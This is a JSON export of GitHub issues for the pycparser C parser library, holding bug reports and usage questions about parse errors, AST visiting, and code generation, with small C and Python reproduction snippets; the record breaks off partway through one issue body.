{"total_count": 236, "incomplete_results": false, "items": [{"url": "https://api.github.com/repos/eliben/pycparser/issues/388", "repository_url": "https://api.github.com/repos/eliben/pycparser", "labels_url": "https://api.github.com/repos/eliben/pycparser/issues/388/labels{/name}", "comments_url": "https://api.github.com/repos/eliben/pycparser/issues/388/comments", "events_url": "https://api.github.com/repos/eliben/pycparser/issues/388/events", "html_url": "https://github.com/eliben/pycparser/issues/388", "id": 667612898, "node_id": "MDU6SXNzdWU2Njc2MTI4OTg=", "number": 388, "title": "How to get functions but not in structs?", "user": {"login": "thoni56", "id": 204496, "node_id": "MDQ6VXNlcjIwNDQ5Ng==", "avatar_url": "https://avatars3.githubusercontent.com/u/204496?v=4", "gravatar_id": "", "url": "https://api.github.com/users/thoni56", "html_url": "https://github.com/thoni56", "followers_url": "https://api.github.com/users/thoni56/followers", "following_url": "https://api.github.com/users/thoni56/following{/other_user}", "gists_url": "https://api.github.com/users/thoni56/gists{/gist_id}", "starred_url": "https://api.github.com/users/thoni56/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/thoni56/subscriptions", "organizations_url": "https://api.github.com/users/thoni56/orgs", "repos_url": "https://api.github.com/users/thoni56/repos", "events_url": "https://api.github.com/users/thoni56/events{/privacy}", "received_events_url": "https://api.github.com/users/thoni56/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 2, "created_at": "2020-07-29T07:19:56Z", "updated_at": "2020-07-30T07:43:12Z", "closed_at": "2020-07-30T07:43:12Z", "author_association": "CONTRIBUTOR", "active_lock_reason": null, "body": "I want to find function definitions/declarations but avoid anything that is not a \"top level\" function, including struct fields that are pointers to functions:\r\n\r\n    struct {\r\n        void (*func)();\r\n    };\r\n\r\nA straight forward approach with `FuncDefVisitor()` does not work since it is impossible to see if the visited node is inside a struct.\r\n\r\nLooping over all nodes on top level feels like re-implementing the visiting dispatch logic.\r\n\r\nIs there an easier way?", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/eliben/pycparser/issues/385", "repository_url": "https://api.github.com/repos/eliben/pycparser", "labels_url": "https://api.github.com/repos/eliben/pycparser/issues/385/labels{/name}", "comments_url": "https://api.github.com/repos/eliben/pycparser/issues/385/comments", "events_url": "https://api.github.com/repos/eliben/pycparser/issues/385/events", "html_url": "https://github.com/eliben/pycparser/issues/385", "id": 655285655, "node_id": "MDU6SXNzdWU2NTUyODU2NTU=", "number": 385, "title": "Exponential time complexity when generating code from AST with nested `sizeof`s.", "user": {"login": "huzecong", "id": 5766101, "node_id": "MDQ6VXNlcjU3NjYxMDE=", "avatar_url": "https://avatars1.githubusercontent.com/u/5766101?v=4", "gravatar_id": "", "url": "https://api.github.com/users/huzecong", "html_url": "https://github.com/huzecong", "followers_url": "https://api.github.com/users/huzecong/followers", "following_url": "https://api.github.com/users/huzecong/following{/other_user}", "gists_url": "https://api.github.com/users/huzecong/gists{/gist_id}", "starred_url": "https://api.github.com/users/huzecong/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/huzecong/subscriptions", "organizations_url": "https://api.github.com/users/huzecong/orgs", "repos_url": "https://api.github.com/users/huzecong/repos", "events_url": "https://api.github.com/users/huzecong/events{/privacy}", "received_events_url": "https://api.github.com/users/huzecong/received_events", "type": "User", "site_admin": false}, "labels": [{"id": 683496320, "node_id": "MDU6TGFiZWw2ODM0OTYzMjA=", "url": "https://api.github.com/repos/eliben/pycparser/labels/patches-welcome", "name": "patches-welcome", "color": "d4c5f9", "default": false, "description": null}], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2020-07-11T21:52:01Z", "updated_at": "2020-07-18T12:48:34Z", "closed_at": "2020-07-18T12:48:34Z", "author_association": "CONTRIBUTOR", "active_lock_reason": null, "body": "Minimum example to reproduce:\r\n```python\r\nfrom pycparser.c_parser import CParser\r\nfrom pycparser.c_generator import CGenerator\r\n\r\n# Code is 30 nested `sizeof`s.\r\ncode = \"int x = sizeof(sizeof(sizeof(sizeof(sizeof(sizeof(sizeof(sizeof(sizeof(sizeof(sizeof(sizeof(sizeof(sizeof(sizeof(sizeof(sizeof(sizeof(sizeof(sizeof(sizeof(sizeof(sizeof(sizeof(sizeof(sizeof(sizeof(sizeof(sizeof(sizeof(int))))))))))))))))))))))))))))));\"\r\ntree = CParser().parse(code)\r\nprint(tree)  # the tree is correct\r\nprint(CGenerator().visit(tree))  # this never stops\r\n```\r\n\r\nThe issue is within `CGenerator.visit_UnaryOp`:\r\nhttps://github.com/eliben/pycparser/blob/61eac63fda12f9ba4504def70d0d76cd3ac1bbff/pycparser/c_generator.py#L61-L72\r\nIn the case where `n.op` is `sizeof`, `n.expr` is visited twice. When there are nested `sizeof`s, the leaf nodes will be visited an exponential number of times. (Although in reality such code wouldn't make sense)\r\n\r\nI can create a PR with a few of my previous issues, but it might take a few days before I can work on this.", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/eliben/pycparser/issues/383", "repository_url": "https://api.github.com/repos/eliben/pycparser", "labels_url": "https://api.github.com/repos/eliben/pycparser/issues/383/labels{/name}", "comments_url": "https://api.github.com/repos/eliben/pycparser/issues/383/comments", "events_url": "https://api.github.com/repos/eliben/pycparser/issues/383/events", "html_url": "https://github.com/eliben/pycparser/issues/383", "id": 644813540, "node_id": "MDU6SXNzdWU2NDQ4MTM1NDA=", "number": 383, "title": "c_ast.Node subclasses don't call __init__ on node", "user": {"login": "pdietl", "id": 10335942, "node_id": "MDQ6VXNlcjEwMzM1OTQy", "avatar_url": "https://avatars0.githubusercontent.com/u/10335942?v=4", "gravatar_id": "", "url": "https://api.github.com/users/pdietl", "html_url": "https://github.com/pdietl", "followers_url": "https://api.github.com/users/pdietl/followers", "following_url": "https://api.github.com/users/pdietl/following{/other_user}", "gists_url": "https://api.github.com/users/pdietl/gists{/gist_id}", "starred_url": "https://api.github.com/users/pdietl/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/pdietl/subscriptions", "organizations_url": "https://api.github.com/users/pdietl/orgs", "repos_url": "https://api.github.com/users/pdietl/repos", "events_url": "https://api.github.com/users/pdietl/events{/privacy}", "received_events_url": "https://api.github.com/users/pdietl/received_events", "type": "User", "site_admin": false}, "labels": [{"id": 202072333, "node_id": "MDU6TGFiZWwyMDIwNzIzMzM=", "url": "https://api.github.com/repos/eliben/pycparser/labels/pending-user-input", "name": "pending-user-input", "color": "fef2c0", "default": false, "description": null}], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 2, "created_at": "2020-06-24T18:10:41Z", "updated_at": "2020-06-30T01:58:38Z", "closed_at": "2020-06-30T01:58:38Z", "author_association": "NONE", "active_lock_reason": null, "body": "I am trying to use this library to find certain function calls and find the type of argument.\r\nTo do this, I have gone the route of trying to add a parent to each node dynamically, by overriding the `generic_visit` method of `c_ast.NodeVisitor`. However, overriding `c_ast.Node`'s `__init__` function to create a `self.parent` attribute doesn't work since none of `c_ast.Node`'s subclasses call `super().__init__`.\r\n\r\nWould it be reasonable to accept a PR that fixes this?", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/eliben/pycparser/issues/382", "repository_url": "https://api.github.com/repos/eliben/pycparser", "labels_url": "https://api.github.com/repos/eliben/pycparser/issues/382/labels{/name}", "comments_url": "https://api.github.com/repos/eliben/pycparser/issues/382/comments", "events_url": "https://api.github.com/repos/eliben/pycparser/issues/382/events", "html_url": "https://github.com/eliben/pycparser/issues/382", "id": 643473200, "node_id": "MDU6SXNzdWU2NDM0NzMyMDA=", "number": 382, "title": "AttributeError: 'Constant' object has no attribute 'name'", "user": {"login": "timur-tabi", "id": 1065860, "node_id": "MDQ6VXNlcjEwNjU4NjA=", "avatar_url": "https://avatars3.githubusercontent.com/u/1065860?v=4", "gravatar_id": "", "url": "https://api.github.com/users/timur-tabi", "html_url": "https://github.com/timur-tabi", "followers_url": "https://api.github.com/users/timur-tabi/followers", "following_url": "https://api.github.com/users/timur-tabi/following{/other_user}", "gists_url": "https://api.github.com/users/timur-tabi/gists{/gist_id}", "starred_url": "https://api.github.com/users/timur-tabi/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/timur-tabi/subscriptions", "organizations_url": "https://api.github.com/users/timur-tabi/orgs", "repos_url": "https://api.github.com/users/timur-tabi/repos", "events_url": "https://api.github.com/users/timur-tabi/events{/privacy}", "received_events_url": "https://api.github.com/users/timur-tabi/received_events", "type": "User", "site_admin": false}, "labels": [{"id": 202072333, "node_id": "MDU6TGFiZWwyMDIwNzIzMzM=", "url": "https://api.github.com/repos/eliben/pycparser/labels/pending-user-input", "name": "pending-user-input", "color": "fef2c0", "default": false, "description": null}], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 2, "created_at": "2020-06-23T02:08:27Z", "updated_at": "2020-06-29T23:49:42Z", "closed_at": "2020-06-29T23:49:42Z", "author_association": "NONE", "active_lock_reason": null, "body": "I've written a test script that's almost identical to func_defs.py, but when I run it, I get this error:\r\n\r\n  File \"/home/ttabi/sw/pvt/ttabi/boardobj.py\", line 29, in visit_FuncCall\r\n    if node.name.name == self.funcname:\r\nAttributeError: 'Constant' object has no attribute 'name'\r\n\r\nI just copied visit_FuncCall verbatim.  I think the API has changed since this example was written, but I don't know Python well enough to debug this.", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/eliben/pycparser/issues/381", "repository_url": "https://api.github.com/repos/eliben/pycparser", "labels_url": "https://api.github.com/repos/eliben/pycparser/issues/381/labels{/name}", "comments_url": "https://api.github.com/repos/eliben/pycparser/issues/381/comments", "events_url": "https://api.github.com/repos/eliben/pycparser/issues/381/events", "html_url": "https://github.com/eliben/pycparser/issues/381", "id": 640759443, "node_id": "MDU6SXNzdWU2NDA3NTk0NDM=", "number": 381, "title": "Error When Parsing Typdef Function Pointer", "user": {"login": "lightsighter", "id": 9311230, "node_id": "MDQ6VXNlcjkzMTEyMzA=", "avatar_url": "https://avatars3.githubusercontent.com/u/9311230?v=4", "gravatar_id": "", "url": "https://api.github.com/users/lightsighter", "html_url": "https://github.com/lightsighter", "followers_url": "https://api.github.com/users/lightsighter/followers", "following_url": "https://api.github.com/users/lightsighter/following{/other_user}", "gists_url": "https://api.github.com/users/lightsighter/gists{/gist_id}", "starred_url": "https://api.github.com/users/lightsighter/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/lightsighter/subscriptions", "organizations_url": "https://api.github.com/users/lightsighter/orgs", "repos_url": "https://api.github.com/users/lightsighter/repos", "events_url": "https://api.github.com/users/lightsighter/events{/privacy}", "received_events_url": "https://api.github.com/users/lightsighter/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2020-06-17T21:40:11Z", "updated_at": "2020-06-23T04:36:33Z", "closed_at": "2020-06-23T04:36:33Z", "author_association": "NONE", "active_lock_reason": null, "body": "The following one-statement header file does not parse:\r\n\r\n```\r\ntypedef\r\n  void (*func_pointer_t)(\r\n    const void * ,\r\n    size_t ,\r\n    const void * ,\r\n    size_t );\r\n```\r\n\r\nIt raises the exception: `pycparser.plyparser.ParseError: <stdin>:4:5: before: size_t`\r\n\r\nHere is a backtrace:\r\n\r\n```\r\nFile \"/lib/python3.7/site-packages/pycparser/c_parser.py\", line 152, in parse\r\n    debug=debuglevel)\r\n  File \"/lib/python3.7/site-packages/pycparser/ply/yacc.py\", line 331, in parse\r\n    return self.parseopt_notrack(input, lexer, debug, tracking, tokenfunc)\r\n  File \"/lib/python3.7/site-packages/pycparser/ply/yacc.py\", line 1199, in parseopt_notrack\r\n    tok = call_errorfunc(self.errorfunc, errtoken, self)\r\n  File \"/lib/python3.7/site-packages/pycparser/ply/yacc.py\", line 193, in call_errorfunc\r\n    r = errorfunc(token)\r\n  File \"/lib/python3.7/site-packages/pycparser/c_parser.py\", line 1848, in p_error\r\n    column=self.clex.find_tok_column(p)))\r\n  File \"/lib/python3.7/site-packages/pycparser/plyparser.py\", line 67, in _parse_error\r\n    raise ParseError(\"%s: %s\" % (coord, msg))\r\n```", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/eliben/pycparser/issues/380", "repository_url": "https://api.github.com/repos/eliben/pycparser", "labels_url": "https://api.github.com/repos/eliben/pycparser/issues/380/labels{/name}", "comments_url": "https://api.github.com/repos/eliben/pycparser/issues/380/comments", "events_url": "https://api.github.com/repos/eliben/pycparser/issues/380/events", "html_url": "https://github.com/eliben/pycparser/issues/380", "id": 625363135, "node_id": "MDU6SXNzdWU2MjUzNjMxMzU=", "number": 380, "title": "\"typedef int  __int128;\" Fails with ParseError: Invalid Declaration", "user": {"login": "DylanYoung", "id": 5795220, "node_id": "MDQ6VXNlcjU3OTUyMjA=", "avatar_url": "https://avatars1.githubusercontent.com/u/5795220?v=4", "gravatar_id": "", "url": "https://api.github.com/users/DylanYoung", "html_url": "https://github.com/DylanYoung", "followers_url": "https://api.github.com/users/DylanYoung/followers", "following_url": "https://api.github.com/users/DylanYoung/following{/other_user}", "gists_url": "https://api.github.com/users/DylanYoung/gists{/gist_id}", "starred_url": "https://api.github.com/users/DylanYoung/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/DylanYoung/subscriptions", "organizations_url": "https://api.github.com/users/DylanYoung/orgs", "repos_url": "https://api.github.com/users/DylanYoung/repos", "events_url": "https://api.github.com/users/DylanYoung/events{/privacy}", "received_events_url": "https://api.github.com/users/DylanYoung/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 3, "created_at": "2020-05-27T04:17:07Z", "updated_at": "2020-05-27T15:51:27Z", "closed_at": "2020-05-27T12:20:58Z", "author_association": "NONE", "active_lock_reason": null, "body": "Seems very specific to the number 128 and double underscore; haven't been able to reproduce with any other example.\r\n\r\nTraceback:\r\n```\r\n>>> p.parse(\"typedef int  __int128;\")\r\nTraceback (most recent call last):\r\n  File \"<stdin>\", line 1, in <module>\r\n  File \"/usr/local/Cellar/python3/3.7.7/Frameworks/Python.framework/Versions/3.7/lib/python3.7/site-packages/pycparser/c_parser.py\", line 152, in parse\r\n    debug=debuglevel)\r\n  File \"/usr/local/Cellar/python3/3.7.7/Frameworks/Python.framework/Versions/3.7/lib/python3.7/site-packages/pycparser/ply/yacc.py\", line 331, in parse\r\n    return self.parseopt_notrack(input, lexer, debug, tracking, tokenfunc)\r\n  File \"/usr/local/Cellar/python3/3.7.7/Frameworks/Python.framework/Versions/3.7/lib/python3.7/site-packages/pycparser/ply/yacc.py\", line 1118, in parseopt_notrack\r\n    p.callable(pslice)\r\n  File \"/usr/local/Cellar/python3/3.7.7/Frameworks/Python.framework/Versions/3.7/lib/python3.7/site-packages/pycparser/c_parser.py\", line 715, in p_decl_body\r\n    typedef_namespace=True)\r\n  File \"/usr/local/Cellar/python3/3.7.7/Frameworks/Python.framework/Versions/3.7/lib/python3.7/site-packages/pycparser/c_parser.py\", line 402, in _build_declarations\r\n    self._parse_error('Invalid declaration', coord)\r\n  File \"/usr/local/Cellar/python3/3.7.7/Frameworks/Python.framework/Versions/3.7/lib/python3.7/site-packages/pycparser/plyparser.py\", line 67, in _parse_error\r\n    raise ParseError(\"%s: %s\" % (coord, msg))\r\npycparser.plyparser.ParseError: :1:9: Invalid declaration\r\n```", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/eliben/pycparser/issues/379", "repository_url": "https://api.github.com/repos/eliben/pycparser", "labels_url": "https://api.github.com/repos/eliben/pycparser/issues/379/labels{/name}", "comments_url": "https://api.github.com/repos/eliben/pycparser/issues/379/comments", "events_url": "https://api.github.com/repos/eliben/pycparser/issues/379/events", "html_url": "https://github.com/eliben/pycparser/issues/379", "id": 625305329, "node_id": "MDU6SXNzdWU2MjUzMDUzMjk=", "number": 379, "title": "`AttributeError` when parsing `struct` with nested `enum`", "user": {"login": "huzecong", "id": 5766101, "node_id": "MDQ6VXNlcjU3NjYxMDE=", "avatar_url": "https://avatars1.githubusercontent.com/u/5766101?v=4", "gravatar_id": "", "url": "https://api.github.com/users/huzecong", "html_url": "https://github.com/huzecong", "followers_url": "https://api.github.com/users/huzecong/followers", "following_url": "https://api.github.com/users/huzecong/following{/other_user}", "gists_url": "https://api.github.com/users/huzecong/gists{/gist_id}", "starred_url": "https://api.github.com/users/huzecong/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/huzecong/subscriptions", "organizations_url": "https://api.github.com/users/huzecong/orgs", "repos_url": "https://api.github.com/users/huzecong/repos", "events_url": "https://api.github.com/users/huzecong/events{/privacy}", "received_events_url": "https://api.github.com/users/huzecong/received_events", "type": "User", "site_admin": false}, "labels": [{"id": 42860514, "node_id": "MDU6TGFiZWw0Mjg2MDUxNA==", "url": "https://api.github.com/repos/eliben/pycparser/labels/bug", "name": "bug", "color": "f7c6c7", "default": true, "description": null}, {"id": 683496320, "node_id": "MDU6TGFiZWw2ODM0OTYzMjA=", "url": "https://api.github.com/repos/eliben/pycparser/labels/patches-welcome", "name": "patches-welcome", "color": "d4c5f9", "default": false, "description": null}], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2020-05-27T01:24:32Z", "updated_at": "2020-07-18T12:48:34Z", "closed_at": "2020-07-18T12:48:34Z", "author_association": "CONTRIBUTOR", "active_lock_reason": null, "body": "When parsing the following code:\r\n```c\r\ntypedef struct {\r\n  enum {\r\n    A = 1\r\n  };\r\n} foo;\r\n```\r\nThe following exception is raised:\r\n```python\r\n~/.pyenv/versions/3.7.2/Python.framework/Versions/3.7/lib/python3.7/site-packages/pycparser/c_parser.py in parse(self, text, filename, debuglevel)\r\n    150                 input=text,\r\n    151                 lexer=self.clex,\r\n--> 152                 debug=debuglevel)\r\n    153\r\n    154     ######################--   PRIVATE   --######################\r\n\r\n~/.pyenv/versions/3.7.2/Python.framework/Versions/3.7/lib/python3.7/site-packages/pycparser/ply/yacc.py in parse(self, input, lexer, debug, tracking, tokenfunc)\r\n    329             return self.parseopt(input, lexer, debug, tracking, tokenfunc)\r\n    330         else:\r\n--> 331             return self.parseopt_notrack(input, lexer, debug, tracking, tokenfunc)\r\n    332\r\n    333\r\n\r\n~/.pyenv/versions/3.7.2/Python.framework/Versions/3.7/lib/python3.7/site-packages/pycparser/ply/yacc.py in parseopt_notrack(self, input, lexer, debug, tracking, tokenfunc)\r\n   1116                             del symstack[-plen:]\r\n   1117                             self.state = state\r\n-> 1118                             p.callable(pslice)\r\n   1119                             del statestack[-plen:]\r\n   1120                             symstack.append(sym)\r\n\r\n~/.pyenv/versions/3.7.2/Python.framework/Versions/3.7/lib/python3.7/site-packages/pycparser/c_parser.py in p_struct_declaration_1(self, p)\r\n    993             decls = self._build_declarations(\r\n    994                 spec=spec,\r\n--> 995                 decls=[dict(decl=decl_type)])\r\n    996\r\n    997         else:\r\n\r\n~/.pyenv/versions/3.7.2/Python.framework/Versions/3.7/lib/python3.7/site-packages/pycparser/c_parser.py in _build_declarations(self, spec, decls, typedef_namespace)\r\n    418             decls_0_tail = decls[0]['decl']\r\n    419             while not isinstance(decls_0_tail, c_ast.TypeDecl):\r\n--> 420                 decls_0_tail = decls_0_tail.type\r\n    421             if decls_0_tail.declname is None:\r\n    422                 decls_0_tail.declname = spec['type'][-1].names[0]\r\n\r\nAttributeError: 'Enum' object has no attribute 'type'\r\n```\r\n\r\nNot sure if the code is standard-conforming, but in any case an `AttributeError` should not be thrown.", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/eliben/pycparser/issues/378", "repository_url": "https://api.github.com/repos/eliben/pycparser", "labels_url": "https://api.github.com/repos/eliben/pycparser/issues/378/labels{/name}", "comments_url": "https://api.github.com/repos/eliben/pycparser/issues/378/comments", "events_url": "https://api.github.com/repos/eliben/pycparser/issues/378/events", "html_url": "https://github.com/eliben/pycparser/issues/378", "id": 625059243, "node_id": "MDU6SXNzdWU2MjUwNTkyNDM=", "number": 378, "title": "Replace assertions with checks that raise `ParseError`s", "user": {"login": "huzecong", "id": 5766101, "node_id": "MDQ6VXNlcjU3NjYxMDE=", "avatar_url": "https://avatars1.githubusercontent.com/u/5766101?v=4", "gravatar_id": "", "url": "https://api.github.com/users/huzecong", "html_url": "https://github.com/huzecong", "followers_url": "https://api.github.com/users/huzecong/followers", "following_url": "https://api.github.com/users/huzecong/following{/other_user}", "gists_url": "https://api.github.com/users/huzecong/gists{/gist_id}", "starred_url": "https://api.github.com/users/huzecong/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/huzecong/subscriptions", "organizations_url": "https://api.github.com/users/huzecong/orgs", "repos_url": "https://api.github.com/users/huzecong/repos", "events_url": "https://api.github.com/users/huzecong/events{/privacy}", "received_events_url": "https://api.github.com/users/huzecong/received_events", "type": "User", "site_admin": false}, "labels": [{"id": 683496320, "node_id": "MDU6TGFiZWw2ODM0OTYzMjA=", "url": "https://api.github.com/repos/eliben/pycparser/labels/patches-welcome", "name": "patches-welcome", "color": "d4c5f9", "default": false, "description": null}], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 2, "created_at": "2020-05-26T17:35:18Z", "updated_at": "2020-07-18T12:48:34Z", "closed_at": "2020-07-18T12:48:34Z", "author_association": "CONTRIBUTOR", "active_lock_reason": null, "body": "https://github.com/eliben/pycparser/blob/61eac63fda12f9ba4504def70d0d76cd3ac1bbff/pycparser/c_parser.py#L464-L467\r\n\r\nIn this and other lines of `c_parser.py`, assertions are used to verify that said condition is true. However, there can be input that will result in the condition being false. For example, the following code triggers an `AssertionError` at the line above:\r\n```c\r\ntypedef struct __attribute__((packed)) {\r\n    char name[36];\r\n    int attr;\r\n} foo;\r\n```\r\nI would argue that the desired behavior here is to be consistent and throw a `ParseError` instead.", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/eliben/pycparser/issues/377", "repository_url": "https://api.github.com/repos/eliben/pycparser", "labels_url": "https://api.github.com/repos/eliben/pycparser/issues/377/labels{/name}", "comments_url": "https://api.github.com/repos/eliben/pycparser/issues/377/comments", "events_url": "https://api.github.com/repos/eliben/pycparser/issues/377/events", "html_url": "https://github.com/eliben/pycparser/issues/377", "id": 624526461, "node_id": "MDU6SXNzdWU2MjQ1MjY0NjE=", "number": 377, "title": "typedef function for pointer define as FuncDecl", "user": {"login": "yevka", "id": 37955368, "node_id": "MDQ6VXNlcjM3OTU1MzY4", "avatar_url": "https://avatars3.githubusercontent.com/u/37955368?v=4", "gravatar_id": "", "url": "https://api.github.com/users/yevka", "html_url": "https://github.com/yevka", "followers_url": "https://api.github.com/users/yevka/followers", "following_url": "https://api.github.com/users/yevka/following{/other_user}", "gists_url": "https://api.github.com/users/yevka/gists{/gist_id}", "starred_url": "https://api.github.com/users/yevka/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/yevka/subscriptions", "organizations_url": "https://api.github.com/users/yevka/orgs", "repos_url": "https://api.github.com/users/yevka/repos", "events_url": "https://api.github.com/users/yevka/events{/privacy}", "received_events_url": "https://api.github.com/users/yevka/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2020-05-26T00:03:06Z", "updated_at": "2020-05-26T00:28:27Z", "closed_at": "2020-05-26T00:28:27Z", "author_association": "NONE", "active_lock_reason": null, "body": "Hi,\r\n\r\nI have a pointer to function\r\n```c\r\n#ifndef SIGNALHANDLER_H_\r\n#define SIGNALHANDLER_H_\r\n\r\ntypedef void (*SignalHandler)(int signum);\r\n\r\n#endif /* SIGNALHANDLER_H_ */\r\n```\r\n\r\nI expect to see nothing. FuncDecl != pointer to function.\r\nHow to distinguish a pointer to function from a function declaration?\r\n\r\n```py\r\nfrom __future__ import print_function\r\nfrom pycparser import c_ast, parse_file, c_generator\r\nimport sys\r\n\r\n# This is not required if you've installed pycparser into\r\n# your site-packages/ with setup.py\r\nsys.path.extend(['.', '..'])\r\n\r\n\r\nclass FuncDeclVisitor(c_ast.NodeVisitor):\r\n    nodes = []\r\n\r\n    def visit_FuncDecl(self, node):\r\n        self.nodes.append(node)\r\n\r\n\r\ndef main():\r\n    c_header = sys.argv[1]\r\n    ast = parse_file(c_header, use_cpp=True, cpp_args=r'-Iutils/fake_libc_include')\r\n    visitor = FuncDeclVisitor()\r\n    visitor.visit(ast)\r\n    generator = c_generator.CGenerator()\r\n    if len(visitor.nodes) > 0:\r\n        for node in visitor.nodes:\r\n            print(node)\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()\r\n```\r\n\r\n```py\r\nFuncDecl(args=ParamList(params=[Decl(name='signum',\r\n                                     quals=[\r\n                                           ],\r\n                                     storage=[\r\n                                             ],\r\n                                     funcspec=[\r\n                                              ],\r\n                                     type=TypeDecl(declname='signum',\r\n                                                   quals=[\r\n                                                         ],\r\n                                                   type=IdentifierType(names=['int'\r\n                                                                             ]\r\n                                                                       )\r\n                                                   ),\r\n                                     init=None,\r\n                                     bitsize=None\r\n                                     )\r\n                               ]\r\n                        ),\r\n         type=TypeDecl(declname='SignalHandler',\r\n                       quals=[\r\n                             ],\r\n                       type=IdentifierType(names=['void'\r\n                                                 ]\r\n                                           )\r\n                       )\r\n         )\r\n```\r\n\r\n\r\n", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/eliben/pycparser/issues/376", "repository_url": "https://api.github.com/repos/eliben/pycparser", "labels_url": "https://api.github.com/repos/eliben/pycparser/issues/376/labels{/name}", "comments_url": "https://api.github.com/repos/eliben/pycparser/issues/376/comments", "events_url": "https://api.github.com/repos/eliben/pycparser/issues/376/events", "html_url": "https://github.com/eliben/pycparser/issues/376", "id": 616702253, "node_id": "MDU6SXNzdWU2MTY3MDIyNTM=", "number": 376, "title": "Debugging: file and line number", "user": {"login": "DylanYoung", "id": 5795220, "node_id": "MDQ6VXNlcjU3OTUyMjA=", "avatar_url": "https://avatars1.githubusercontent.com/u/5795220?v=4", "gravatar_id": "", "url": "https://api.github.com/users/DylanYoung", "html_url": "https://github.com/DylanYoung", "followers_url": "https://api.github.com/users/DylanYoung/followers", "following_url": "https://api.github.com/users/DylanYoung/following{/other_user}", "gists_url": "https://api.github.com/users/DylanYoung/gists{/gist_id}", "starred_url": "https://api.github.com/users/DylanYoung/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/DylanYoung/subscriptions", "organizations_url": "https://api.github.com/users/DylanYoung/orgs", "repos_url": "https://api.github.com/users/DylanYoung/repos", "events_url": "https://api.github.com/users/DylanYoung/events{/privacy}", "received_events_url": "https://api.github.com/users/DylanYoung/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2020-05-12T14:27:54Z", "updated_at": "2020-05-26T01:56:31Z", "closed_at": "2020-05-26T01:56:31Z", "author_association": "NONE", "active_lock_reason": null, "body": "I'm curious if there's some way to trace errors back to the original file. \r\n\r\nIf not, can we use #line directives for this?\r\n\r\nIf this is acceptable, I'm happy to work up a PR.", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/eliben/pycparser/issues/374", "repository_url": "https://api.github.com/repos/eliben/pycparser", "labels_url": "https://api.github.com/repos/eliben/pycparser/issues/374/labels{/name}", "comments_url": "https://api.github.com/repos/eliben/pycparser/issues/374/comments", "events_url": "https://api.github.com/repos/eliben/pycparser/issues/374/events", "html_url": "https://github.com/eliben/pycparser/issues/374", "id": 608449880, "node_id": "MDU6SXNzdWU2MDg0NDk4ODA=", "number": 374, "title": "Parsing of structure", "user": {"login": "lilian-raillon", "id": 64488569, "node_id": "MDQ6VXNlcjY0NDg4NTY5", "avatar_url": "https://avatars2.githubusercontent.com/u/64488569?v=4", "gravatar_id": "", "url": "https://api.github.com/users/lilian-raillon", "html_url": "https://github.com/lilian-raillon", "followers_url": "https://api.github.com/users/lilian-raillon/followers", "following_url": "https://api.github.com/users/lilian-raillon/following{/other_user}", "gists_url": "https://api.github.com/users/lilian-raillon/gists{/gist_id}", "starred_url": "https://api.github.com/users/lilian-raillon/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/lilian-raillon/subscriptions", "organizations_url": "https://api.github.com/users/lilian-raillon/orgs", "repos_url": "https://api.github.com/users/lilian-raillon/repos", "events_url": "https://api.github.com/users/lilian-raillon/events{/privacy}", "received_events_url": "https://api.github.com/users/lilian-raillon/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2020-04-28T16:25:37Z", "updated_at": "2020-04-29T12:54:17Z", "closed_at": "2020-04-29T12:54:17Z", "author_association": "NONE", "active_lock_reason": null, "body": "Hello!\r\n\r\nI have the following C code:\r\n``` c\r\n#include <stdio.h>\r\n#include <stdlib.h>\r\n#include <string.h>\r\n\r\n\r\nstruct s_level1 {\r\n        char *ptr;\r\n        char array[10];\r\n} level1_t;\r\n\r\nstruct s_level0 {\r\n        struct s_level1 level1;\r\n        struct s_level1 level1bis;\r\n        char payload[10];\r\n} packet_t;\r\n\r\nvoid function(char array[])\r\n{\r\n}\r\n\r\nint main() {\r\n    struct s_level0 level0;\r\n\r\n    level0.level1.ptr = NULL;\r\n    level0.level1.ptr = malloc(100*sizeof(char));\r\n\r\n    printf(\"%s\\n\", level0.level1.ptr);\r\n    function(level0.level1.array);\r\n    printf(\"End\\n\");\r\n\r\n    return 0;\r\n}\r\n```\r\n\r\nWhen Pycparser reaches the line 